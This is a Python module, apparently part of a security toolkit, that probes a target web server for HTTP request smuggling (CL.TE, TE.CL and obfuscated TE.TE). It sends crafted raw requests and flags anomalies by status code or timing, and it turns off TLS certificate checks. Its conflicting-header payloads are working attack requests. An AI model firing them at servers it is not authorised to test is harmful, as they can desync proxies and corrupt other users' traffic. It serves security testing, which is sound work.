"""bingo/tools/smuggling_scanner.py — HTTP 요청 스머글링 탐지 (CL.TE / TE.CL / TE.TE) v2.6.0"""
from __future__ import annotations

import socket
import ssl
import time
from dataclasses import dataclass, field
from typing import Callable
import urllib.parse


@dataclass
class SmugglingFinding:
    technique: str          # "CL.TE" | "TE.CL" | "TE.TE" | "timing"
    url: str
    payload: str
    status: int
    response_time: float
    confirmed: bool
    severity: str = "CRITICAL"
    notes: str = ""


@dataclass
class SmugglingReport:
    target: str
    findings: list[SmugglingFinding] = field(default_factory=list)

    @property
    def vulnerable(self) -> list[SmugglingFinding]:
        return [f for f in self.findings if f.confirmed]


class SmugglingScanner:
    """HTTP 요청 스머글링 자동 탐지"""

    def __init__(
        self,
        base_url: str,
        headers: dict | None = None,
        timeout: float = 10.0,
    ) -> None:
        self.base = base_url.rstrip("/")
        self.headers = headers or {}
        self.timeout = timeout
        parsed = urllib.parse.urlparse(self.base)
        self.host = parsed.hostname or ""
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.use_ssl = parsed.scheme == "https"
        self.path = parsed.path or "/"

    def _raw_request(self, raw: bytes) -> tuple[int, str, float]:
        """소켓으로 원시 HTTP 요청 전송"""
        t0 = time.time()
        try:
            sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
            if self.use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.host)
            sock.sendall(raw)
            resp = b""
            sock.settimeout(self.timeout)
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
            except socket.timeout:
                pass
            sock.close()
            elapsed = time.time() - t0
            resp_str = resp.decode("utf-8", errors="replace")
            # 상태코드 추출
            status = 0
            if resp_str.startswith("HTTP/"):
                try:
                    status = int(resp_str.split(" ")[1])
                except Exception:
                    pass
            return status, resp_str, elapsed
        except Exception as e:
            return 0, str(e), time.time() - t0

    # ── CL.TE 탐지 ────────────────────────────────────────────────────────────
    def _test_cl_te(self) -> SmugglingFinding | None:
        """CL.TE: Content-Length 기준 앞단, Transfer-Encoding 기준 뒷단"""
        payload = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: close\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "G"
        ).encode()

        status, resp, elapsed = self._raw_request(payload)
        confirmed = status == 400 or "Invalid request" in resp or elapsed > 5
        return SmugglingFinding(
            technique="CL.TE", url=self.base,
            payload="Content-Length: 6 / Transfer-Encoding: chunked + 'G' trailer",
            status=status, response_time=elapsed,
            confirmed=confirmed,
            notes="Server parsed CL (6 bytes) instead of TE, trailer 'G' caused 400 or timeout"
        ) if (confirmed or status in (400, 505)) else None

    # ── TE.CL 탐지 ────────────────────────────────────────────────────────────
    def _test_te_cl(self) -> SmugglingFinding | None:
        """TE.CL: Transfer-Encoding 기준 앞단, Content-Length 기준 뒷단"""
        body = "5c\r\nSMUGGLED\r\n0\r\n\r\n"
        payload = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body) + 10}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: close\r\n"
            "\r\n"
            + body
        ).encode()

        status, resp, elapsed = self._raw_request(payload)
        confirmed = elapsed > (self.timeout * 0.8)
        return SmugglingFinding(
            technique="TE.CL", url=self.base,
            payload="Transfer-Encoding: chunked with body mismatch vs Content-Length",
            status=status, response_time=elapsed,
            confirmed=confirmed,
            notes=f"Timing attack: {elapsed:.2f}s (threshold: {self.timeout * 0.8:.1f}s)"
        ) if confirmed else None

    # ── TE.TE 탐지 (헤더 난독화) ─────────────────────────────────────────────
    def _test_te_te(self) -> list[SmugglingFinding]:
        findings = []
        obfuscations = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding: CHUNKED",
            "Transfer-Encoding:\tchunked",
            "X-Transfer-Encoding: chunked",
        ]
        for te_header in obfuscations:
            raw = (
                f"POST {self.path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 4\r\n"
                f"{te_header}\r\n"
                "Connection: close\r\n"
                "\r\n"
                "1\r\na\r\n0\r\n\r\n"
            ).encode()
            status, resp, elapsed = self._raw_request(raw)
            if status in (400, 500) or elapsed > 5:
                findings.append(SmugglingFinding(
                    technique="TE.TE", url=self.base,
                    payload=te_header,
                    status=status, response_time=elapsed,
                    confirmed=True,
                    notes=f"Obfuscated TE header triggered response anomaly"
                ))
        return findings

    def scan(self) -> SmugglingReport:
        report = SmugglingReport(target=self.base)

        cl_te = self._test_cl_te()
        if cl_te:
            report.findings.append(cl_te)

        te_cl = self._test_te_cl()
        if te_cl:
            report.findings.append(te_cl)

        report.findings.extend(self._test_te_te())
        return report


# ── 편의 함수 ─────────────────────────────────────────────────────────────────
def quick_smuggle_check(url: str) -> SmugglingReport:
    scanner = SmugglingScanner(url)
    return scanner.scan()
